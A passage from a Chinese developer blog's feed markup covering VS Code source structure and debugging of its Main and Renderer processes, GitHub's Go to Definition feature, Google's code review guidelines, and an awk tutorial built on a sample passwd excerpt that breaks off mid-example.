├── electron-browser/</span><br><span class="line">│                 ├── workbench<span class="selector-class">.js</span></span><br><span class="line">│                 └── workbench/workbench<span class="selector-class">.html</span></span><br><span class="line">│            └── electron-main/</span><br><span class="line">│                 ├── <span class="selector-tag">main</span><span class="selector-class">.ts</span></span><br><span class="line">│                 └── window<span class="selector-class">.ts</span></span><br><span class="line">│       ├── editor/</span><br><span class="line">│       ├── platform/</span><br><span class="line">│       ├── server/</span><br><span class="line">│       └── workbench/</span><br><span class="line">└── test/</span><br></pre></td></tr></table></figure><p>上面这一坨看起来有点多，不过捋清楚了，也就好理解了，下面我们就一个一个地解释下：</p><ul><li><code>azure-pipelines.yml</code>，看名字就知道是啥意思，它是一个 CI&#x2F;CD 的配置，自动测试、构建、打包</li><li><code>build/</code>，这里面放的是 VS Code 项目的构建工具，相对来说还是比较复杂的，主要是因为它顾及了 Linux&#x2F;Mac&#x2F;Windows 三个平台</li><li><code>extensions/</code>，VS Code 的内置模块，包含各种语言高亮的 LSP 相关模块</li><li><code>gulpfile.js</code>，构建脚本，暂时不用细看，可以关注 <code>package.json</code> 的 scripts，里面放着一些程序的快捷启动方式，而且针对内存溢出做了防御，如 <code>--max_old_space_size=4095</code></li><li><code>out/</code>，构建的结果都放在这个目录下</li><li><code>package.json</code>，需要着重看看 <code>main</code> 和 <code>scripts</code> 两个字段</li><li><code>product.json</code>，如果你想根据 VS Code 进行二次开发，建立自己的品牌，建议搞懂这个文件，因为你需要修改它</li><li><code>resource/</code>，打包构建生成安装包（exe&#x2F;dmg&#x2F;deb 等）的时候需要依赖的额外资源</li><li><code>scripts/</code>，开发过程各种会用到的脚本，用的比较多的可能是 <code>./scripts/code.sh</code></li><li><code>test/</code>，放的是各种自动化、冒烟、UI 测试脚本，这里值得学习和研究下</li><li><code>src/</code>，核心源码，入口是 <code>main.js</code><ul><li>Main Process 的实际调用路径是 <code>main.js -&gt; vs/code/electron-main/main.ts -&gt; vs/code/electron-main/window.ts</code>，在 <code>window.ts</code> 启动了一个 <code>BrowserWindow</code> 加载了 <code>vs/code/electron-browser/workbench/workbench.html</code></li><li>Renderer Process 的实际路径是 <code>vs/code/electron-browser/workbench/workbench.html -&gt; vs/code/electron-browser/workbench/workbench.js</code>，核心逻辑在 <code>workbench.js</code> 中</li><li>而 src 下还有一个核心目录 <code>browser</code>，它是 Web 版本的启动入口</li></ul></li></ul><p>VS Code 的复杂度，有好几块，分别是构建、IoC 机制、RPC 设计、ExtensionHost 环境等，再加上 Electron 本身的各种坑，后续我们可以一一进行探讨。</p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>在玩转 VS Code 架构设计之前，我们需要先搞清楚代码的大致执行流程，还要学会在遇到问题时调试它的代码，光靠通扫几遍源码你是很难完全理解的。</p><p>VS Code 的使用文档写的非常棒，但是架构和设计文档只能从代码中自己探索，这是可以理解的，VS Code 目前还在高速发展中，内部架构设计调整也十分频繁，而且他们可能倡导的是“代码即文档”，通过一些规范化约束来帮助开发者理解架构设计。</p><p>不过没关系，既然开源了，就自己研究好了。下面我们先看看如何对 VS Code 的各块代码进行有效调试。</p><p>说到调试，有几个基础知识不得不提一提，不解释清楚，很多同学是无法理解为什么在工具上点几下就会进入调试的。</p><h4 id="Node-js-调试"><a href="#Node-js-调试" class="headerlink" title="Node.js 调试"></a>Node.js 调试</h4><p>Electron 的 <code>Main Process</code> 本质就是一个 Node.js 进程，你可以执行如下命令看看 Electron 的 bin 文件内容：</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">npm install -g electron</span><br><span class="line">head -n <span class="number">5</span> <span class="constructor">$(<span class="params">where</span> <span class="params">electron</span> | <span class="params">head</span> -<span class="params">n</span> 1)</span></span><br></pre></td></tr></table></figure><p>打印出来的结果是：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env node</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> electron = <span class="built_in">require</span>(<span class="string">&#x27;./&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> proc = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)</span><br></pre></td></tr></table></figure><p>对 Node.js 的调试，可以看看我四年前写的 <a href="https://www.barretlee.com/blog/2015/10/07/debug-nodejs-in-command-line/">《NodeJS 的代码调试和性能调优》</a>，时间有点久了，不过调试原理并没有啥变化。</p><blockquote><p>简单来说，就是启动 Node 时增加了一个 <code>--debug-brk</code> 入参（新版是 <code>--inspect-brk</code>），开启一个可供外部断点调试的端口，然后在外部使用各类工具连接端口，发送指令进行调试。</p></blockquote><h4 id="Chrome-调试"><a href="#Chrome-调试" class="headerlink" title="Chrome 调试"></a>Chrome 调试</h4><p>Chromium 在启动的时候有一个可选参数 <code>--remote-debugging-port</code>, 加上这个参数以后，它会开启远程调试模式，如：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/Applications/</span>Google\ Chrome.app<span class="regexp">/Contents/</span>MacOS/Google\ Chrome -remote-debugging-port=<span class="number">9222</span></span><br></pre></td></tr></table></figure><blockquote><p>如果你的 Chrome 已经启动，上面的命令不会有效果，可以考虑下载一个 Google Chrome Canary</p></blockquote><p>通过 <code>http://127.0.0.1:9222/json</code> 可以看到当前 Chrome 打开了哪些页面，并且它还会把 DevTools 的 ws 地址也展示出来：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">   <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;devtoolsFrontendUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/devtools/inspector.html?ws=127.0.0.1:9222/devtools/page/3CFC...&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3CFC338A39A4CF1F31F0CB499D94C071&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;新标签页&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;page&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;chrome://newtab/&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;webSocketDebuggerUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ws://127.0.0.1:9222/devtools/page/3CFC...&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们来做一个小小的实验，上面打开了一个 Chrome，并且展示了一个空标签页，我们尝试使用 websocket 连接它，然后控制它：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> wsUrl = <span class="string">&quot;ws://127.0.0.1:9222/devtools/page/3CFC...&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(wsUrl);</span><br><span class="line">ws.<span class="property">onmessage</span> = <span class="function"><span class="params">data</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">ws.<span class="property">onclose</span> = <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;closed&#x27;</span>);</span><br><span class="line">ws.<span class="property">onopen</span> = <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;opened&#x27;</span>);</span><br></pre></td></tr></table></figure><p>随便找个浏览器的控制台执行这段脚本，会看到打印出来了 <code>opened</code>，然后我们尝试让这个 “新标签页” 跳转到我的博客首页，发送几句命令：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 开启网络功能</span></span><br><span class="line">ws.<span class="title function_">send</span>(<span class="string">`&#123;</span></span><br><span class="line"><span class="string">  &quot;id&quot;:1,</span></span><br><span class="line"><span class="string">  &quot;method&quot;:&quot;Network.enable&quot;</span></span><br><span class="line"><span class="string">&#125;`</span>)；</span><br><span class="line"><span class="comment">// 跳转页面</span></span><br><span class="line">ws.<span class="title function_">send</span>(<span class="string">`&#123;</span></span><br><span class="line"><span class="string">  &quot;id&quot;: 1,</span></span><br><span class="line"><span class="string">  &quot;method&quot;: &quot;Page.navigate&quot;,</span></span><br><span class="line"><span class="string">  &quot;params&quot;: &#123; &quot;url&quot;: &quot;https://www.barretlee.com&quot; &#125;</span></span><br><span class="line"><span class="string">&#125;`</span>);</span><br></pre></td></tr></table></figure><p>你会看到，通过命令行打开的 Chrome 的默认页已经自动跳转到了 <code>https://www.barretlee.com</code>，看到这里你应该已经可以理解了，所谓的调试，其实就是通过连接 Chrome 内部的 DevTools 工具，然后利用 RPC 的方式进行通讯，事实上，这里用到的是 <a href="https://chromedevtools.github.io/devtools-protocol/">Remote Debugging Protocol</a> 进行的通讯。</p><blockquote><p>大名鼎鼎的 <a href="https://github.com/GoogleChrome/puppeteer">Puppeteer</a> 就是基于这层协议做的封装。</p></blockquote><p>好了，为了让你理解 VS Code 的调试原理，已经做了很多铺垫了，事实上，在 VS Code 上进行调试的操作是十分简单的，下面就带着你一起演示下。</p><h3 id="软件调试"><a href="#软件调试" class="headerlink" title="软件调试"></a>软件调试</h3><p>使用 VS Code 打开 VS Code 的源码，点开左侧 sidebar 的 Debug Tab，你会看到调试区域存在很多个调试选项：</p><p><img src="/../blogimgs/2019/11/01/vscode-debug-panel.png" alt="VSCode Debug Panel"></p><p>这里的所有调试配置，都对应着项目中 <code>.vscode/launch.json</code> 的内容，我之前写过一篇关于 <code>launch.json</code> 的 <a href="https://www.barretlee.com/blog/2019/03/18/debugging-in-vscode-tutorial/">文章</a>，在这里我们又有机会用到了。</p><p>软件的调试分为两个部分，一个是 Main 进程的调试，一个是 Renderer 进程的调试。</p><blockquote><p>开始调试之前，请先把 VS Code Dev 的监听模式打开，项目目录下执行 <code>yarn watch</code></p></blockquote><h4 id="Main-进程调试"><a href="#Main-进程调试" class="headerlink" title="Main 进程调试"></a>Main 进程调试</h4><p>先进入到一个 Main 进程会执行到的代码区域，打一个断点，如 <code>vs/code/electron-main/main.ts:404:0</code>，然后选择 <code>launch.json</code> 中的 <code>Launch VS Code (Main Process)</code> 配置：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Launch VS Code (Main Process)&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;runtimeExecutable&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/scripts/code.sh&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;windows&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;runtimeExecutable&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/scripts/code.bat&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;runtimeArgs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;--no-cached-data&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;outFiles&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;$&#123;workspaceFolder&#125;/out/**/*.js&quot;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>启动的默认端口是 <code>5875</code>，点击开始调试按钮，或者按下快捷键 <code>F5</code>，便会进入调试模块，在 VS Code 上也有体现：</p><p><img src="/../blogimgs/2019/11/01/vscode-node-debugging.png" alt="VSCode Node Debugging"></p><p>可以看到我们打点的位置也已经亮了起来，阻塞了 VS Code Dev 的启动：</p><p><img src="/../blogimgs/2019/11/01/vscode-node-deubgging-demo.png" alt="VSCode Node Debugging Demo"></p><p>好了，现在可以开始你的 Main 进程代码探索之旅了。</p><blockquote><p>需要注意，在调试 Main Process 的时候，不要把断点打到 Renderer 进程里去了，否则你永远也进不了断点；也不要打到 Main Process 不会执行的代码区域，这就要求你对 VS Code 的目录结构有一定的了解了，可以参考“初识 VS Code”章节的介绍</p></blockquote><p>另外，再给你留了一道作业题：</p><blockquote><p>尝试使用其他工具，如 node-inspector 或者 Webstorm 调试 Main 进程。</p></blockquote><h4 id="Renderer-进程的调试"><a href="#Renderer-进程的调试" class="headerlink" title="Renderer 进程的调试"></a>Renderer 进程的调试</h4><p>Renderer 进程的调试，本质就是通过外部工具连接 Electron 中 Chromium 打开的一个 DevTools Server，使用 WebSocket 建立连接，然后发送和接受各种指令。</p><p>选择 <code>launch.json</code> 中的 <code>Launch VS Code</code>，它的内容是：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;chrome&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Launch VS Code&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;windows&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;runtimeExecutable&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/scripts/code.bat&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;osx&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;runtimeExecutable&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/scripts/code.sh&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;linux&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;runtimeExecutable&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/scripts/code.sh&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;timeout&quot;</span><span class="punctuation">:</span> <span class="number">20000</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;env&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;VSCODE_EXTHOST_WILL_SEND_SOCKET&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;breakOnLoad&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;urlFilter&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*workbench.html*&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;runtimeArgs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;--inspect=5875&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;--no-cached-data&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;webRoot&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>同样，开启调试后，找个 Renderer 进程会执行到的代码块进行断点，如 <code>vs/code/workbench/workbench.desktop.main.ts</code>，如果你的 VS Code Dev 已经启动了，可以在 VS Code Dev 的界面中按下 <code>cmd+r</code>，它会自动刷新 Renderer 进程（刷新页面），重新进入你的断点：</p><p><img src="/../blogimgs/2019/11/01/vscode-chrome-deubgging.png" alt="VSCode Chrome Debugging"></p><p>怎么样，看到这里，是不是对开发 VS Code 的源码已经有信心了。</p><blockquote><p>需要注意的是，如果你是通过 <code>./script/code.sh</code> 在控制台手动启动的 VS Code Dev，<code>launch.json</code> 中的 <code>Attach to VS Code</code> 是无效的，因为在启动的时候，不会默认添加 –remote-debugging-port 入参</p></blockquote><h3 id="构建脚本调试"><a href="#构建脚本调试" class="headerlink" title="构建脚本调试"></a>构建脚本调试</h3><p>知道了如何对软件本身的代码进行调试，大部分情况下已经够用了，但是如果你在启动 VS Code 的时候失败了，报了个错，或者当你打包 VS Code 的时候，抛出个异常，需要怎么排查问题呢？</p><p>这里，我们可以了解下构建脚本的调试，虽说构建脚本我们可以随时写一句 <code>console.log</code> 打印日志，但是 VS Code 的 <code>build</code> 脚本是非常多，而且每一次的构建都特别漫长，还是更加推荐你使用它提供的构建脚本调试能力进行 Debug，在 <code>launch.json</code> 中有一个 <code>Gulp Build</code> 配置：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Gulp Build&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/node_modules/gulp/bin/gulp.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;stopOnEntry&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;hygiene&quot;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>通过这个配置启动 gulp，这样就可以对构建脚本进行断点了，由于配置中加了 <code>stopOnEntry</code>，当进入调试的时候，第一行就会断住：</p><p><img src="/../blogimgs/2019/11/01/debug-grulp.png" alt="VSCode Gulp Debugging"></p><p>你也可以去掉这个参数，不过需要你在执行 gulp 之前在程序中提前断一个点：</p><p><img src="/../blogimgs/2019/11/01/debug-gulp-file.png" alt="VSCode Gulp Debugging"></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>好了，VS Code 源码的调试教程就写到这里，希望你读完这篇文章以后，可以自己动手去尝试，很多比较细节的点我没有写全面，所以实践过程中你可能还会遇到一些坑，当你躺平了这些坑，相信你就可以完全理解这些调试的基本原理了。</p><p>后续将带着大家看一看 VS Code 的整体执行链路，其实上次我已经写过一篇类似的 <a href="https://www.barretlee.com/blog/2019/08/03/vscode-source-code-reading-notes/">文章</a>了，行文比较粗糙，下次将带着大家一边调试一边看代码和执行链路。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂谈 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VSCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github 的 Go to Definition 功能实现剖析</title>
      <link href="/blog/2019/10/31/github-go-to-definition/"/>
      <url>/blog/2019/10/31/github-go-to-definition/</url>
      
        <content type="html"><![CDATA[<p>Github 的源码阅读已经支持 Go to Definition 了，目前还在 beta 阶段，且需要用户手动开启，仔细研究了下它的实现方式，从逻辑上看是存在 bug 的，整体策略大概是：</p><p><img src="/../blogimgs/2019/10/31/go-to-definition.png" alt="Go to Definition"></p><ol><li>仓库进入 Navigation 模式（initialization），Github Server 端对该版本（取 commit hash）的源码进行词法分析，保存关键 token 信息，并记录关键 token 的初始定义位置和被引用的位置；</li><li>用户进入网页，若 initialization 未完成则无效果；否则启动 Navigation 模式；</li><li>探测用户鼠标 hover 事件，当 hover 到 textNode 节点时，取出节点位置，这里用到的是一个新的 API：document.caretRangeFromPoint；</li><li>步骤 3 中拿到的只是 offset，它是个位置数值信息，通过正则 &#x2F;\w+[!?]?&#x2F;g 匹配出 hover 到的目标文本，然后将信息发送到 Server，入参包括文本、文件路径、commit hash 和语言类型；</li><li>Server 端返回步骤 1 中生成的 token 元数据，并直接解析成 HTML，前端展示</li></ol><p>这里的 bug 就出现在第 5 步，如果某个变量在两个子作用域中定义，那么 Server 端是无法识别它的 Definition 属于哪个作用域的（我没测试，从理论上讲，应该有这个 bug），另外它 hover 到任何单词都会发送请求，但是后台却只对 function 做了识别，其他类型都是无返回的。</p><p>简单来说，这个 beta 功能可以满足部分场景的需要，但并不能完全覆盖且准确地识别所有类型。真要完整识别，应该只能在浏览器端通过 LSP 协议来做，不过这么做的话，对网络 IO 和本地 CPU 都是一个巨大的挑战，Web 版的 VS Code 会有这个能力，我估计 Github 网页上不会提供。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> Go to Definition </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google 的 Code Review 实践经验</title>
      <link href="/blog/2019/10/30/google-code-review-practice/"/>
      <url>/blog/2019/10/30/google-code-review-practice/</url>
      
        <content type="html"><![CDATA[<p>Google 的 Code Review 目标是不断提高 codebase 的质量，同时要求审阅者在代码的高质量和业务的推进之间做好权衡，两边的极端都不要走，并给出了一些 <a href="https://google.github.io/eng-practices/review/reviewer/looking-for.html">实战经验</a>，下面我总结了下：</p><p><strong>1. 设计</strong></p><p>新增的几块代码是否有意义？代码的结构是否合理，应该放在 codebase 里还是抽离成组件？对系统的持续集成是否会造成印象？等等。</p><p><strong>2. 功能</strong></p><p>站在用户的角度和开发者的角度，从功能和代码块上去审阅功能的合理性，除此之外，还要考虑单从代码上看不到的问题，比如并发问题、UI 交互问题、死锁问题等等。</p><p><strong>3. 复杂度</strong></p><p>审查是否存在工程上的过度设计，鼓励解决当下的问题，不要对未来做过多的设计，因为未来（业务）充满了不确定性。</p><p><strong>4. 测试</strong></p><p>除非是紧急上线，一般情况下，都要求提交的代码有单元测试、集成测试和端对端测试，要确保测试用例正确、有意义、有效果。</p><p><strong>5. 命名</strong></p><p>开发者是否给所有的变量都准确命名？一个好的命名不应太长也不可过短，刚好让人看懂的长度最好了。</p><p><strong>6. 注释</strong></p><p>开发者写的注释除了他自己外其他看得懂么？所有的注释是否是有意义的？是否描述清楚了代码是干啥的？有一点需要强调：对于正则以及复杂的逻辑是必须加注释的。</p><p><strong>7. 格式</strong></p><p>这一块我觉得他讲的并不好，格式主要在工具层面通过 lint 来纠正，只不过格式之外会有一些团队的约定，需要人为去判断或者不好工具检测的部分，可以在 Code Review 的时候提出来。</p><p><strong>8. 文档</strong></p><p>相关的 README 或者文档自动生成工具是否补全，废弃的代码、文档是否删除等。</p><p><strong>9. 每一行</strong></p><p>确保每一行都仔细审阅，包括数据文件、自动生成的文件、大的数据结构描述等等，如果代码很难阅读，你应该提前告诉开发者注意这方面的问题，难阅读的代码，对任何人都是一样难阅读的，这种代码应该尽量避免出现。</p><p><strong>10. 上下文</strong></p><p>Code Review 工具一般只会展示 diff 的内容，有的时候，你需要阅读整个文件，以确保开发者的逻辑是有用的，站在系统层面去考虑，这段代码是否会带来复杂度，是否是健康的，等等。</p><p><strong>11. 好的内容</strong></p><p>如果你看到开发者写的内容不错，不要吝啬的赞美和鼓励。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记本 </category>
          
          <category> 翻译 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Code Review </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>换一种视角理解 awk 命令</title>
      <link href="/blog/2019/10/29/awk/"/>
      <url>/blog/2019/10/29/awk/</url>
      
        <content type="html"><![CDATA[<p>awk 是使用频度非常高的一个超级有用的命令，如果你做过应用的线上运维，想必已经是十分熟悉了，但是对大多数人来说，它仍然是个陌生的东西，即便看过很多次文档，依然记不住它的模样，还是得翻文档、查 Google。下面我就带着你，换一种视角重新理解 awk。</p><p><img src="/../blogimgs/2019/10/29/awk.jpg" alt="AWK"></p><p>它是什么？我觉得它就是一个表单筛选工具，往下看。</p><h3 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h3><p>下面是我截取 <code>cat /etc/passwd</code> 的部分内容，</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br></pre></td></tr></table></figure><p>保存为 <code>1.txt</code>，然后执行如下命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> 1.txt | awk -F : <span class="string">&#x27; BEGIN\</span></span><br><span class="line"><span class="string"> &#123; print &quot;No. R1 R3 R4&quot;; count = 0 &#125;\</span></span><br><span class="line"><span class="string"> $3 &gt; 5 &amp;&amp; $3 &lt; 50 &amp;&amp;\</span></span><br><span class="line"><span class="string"> $1 !~ /root/\</span></span><br><span class="line"><span class="string"> &#123; count += 1; print NR, $1, $3, $4&#125; END\</span></span><br><span class="line"><span class="string"> &#123; print &quot;total &quot; count &quot; lines&quot; &#125; &#x27;</span></span><br></pre></td></tr></table></figure><p>输入的内容是：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">No. R1 R3 R4</span><br><span class="line">7 man 6 12</span><br><span class="line">8 lp 7 7</span><br><span class="line">9 mail 8 8</span><br><span class="line">10 news 9 9</span><br><span class="line">total 4 lines</span><br></pre></td></tr></table></figure><p>看起来好像很复杂的样子，下面我们进行分解动作，一步一步带你认识 awk 的世界。</p><h3 id="获取表单"><a href="#获取表单" class="headerlink" title="获取表单"></a>获取表单</h3><p>例子里的数据是结构化的，每一行有 7 条数据，使用 <code>:</code> 连接符合并成一行，总共 10 行，所以你看到的就是一个无表头的 10 行 7 列数据，我们可以通过如下命令对表单进行整理：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> 1.txt | awk -F : <span class="string">&#x27; &#123; print $1, $2, $3, $4, $5, $6, $7 &#125; &#x27;</span></span><br></pre></td></tr></table></figure><p><code>-F</code> 是分隔符标识，默认 awk 命令以空格作为分隔符，在这个例子中，我们需要告诉程序 <code>:</code> 为列分隔符。这条命令执行的结果是：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">root x 0 0 root /root /bin/bash</span><br><span class="line">daemon x 1 1 daemon /usr/sbin /usr/sbin/nologin</span><br><span class="line">bin x 2 2 bin /bin /usr/sbin/nologin</span><br><span class="line">sys x 3 3 sys /dev /usr/sbin/nologin</span><br><span class="line">sync x 4 65534 sync /bin /bin/sync</span><br><span class="line">games x 5 60 games /usr/games /usr/sbin/nologin</span><br><span class="line">man x 6 12 man /var/cache/man /usr/sbin/nologin</span><br><span class="line">lp x 7 7 lp /var/spool/lpd /usr/sbin/nologin</span><br><span class="line">mail x 8 8 mail /var/mail /usr/sbin/nologin</span><br><span class="line">news x 9 9 news /var/spool/news /usr/sbin/nologin</span><br></pre></td></tr></table></figure><p><code>$0</code> 会打印整行数据，<code>$1</code> 表示第一列数据，同理，我们将七列数据都打印了出来，<code>$1</code> 到 <code>$7</code> 都是 <code>print</code> 函数的入参，事实上，它与这种写法是一个意思：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> 1.txt | awk -F : <span class="string">&#x27; &#123; print($1, $2, $3, $4, $5, $6, $7) &#125; &#x27;</span></span><br></pre></td></tr></table></figure><h3 id="添加表头"><a href="#添加表头" class="headerlink" title="添加表头"></a>添加表头</h3><p>由于我们提供的数据没有表头，我们给它加上：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> 1.txt | awk -F : <span class="string">&#x27; BEGIN &#123;\</span></span><br><span class="line"><span class="string">  print(&quot;No.&quot;, &quot;R1&quot;, 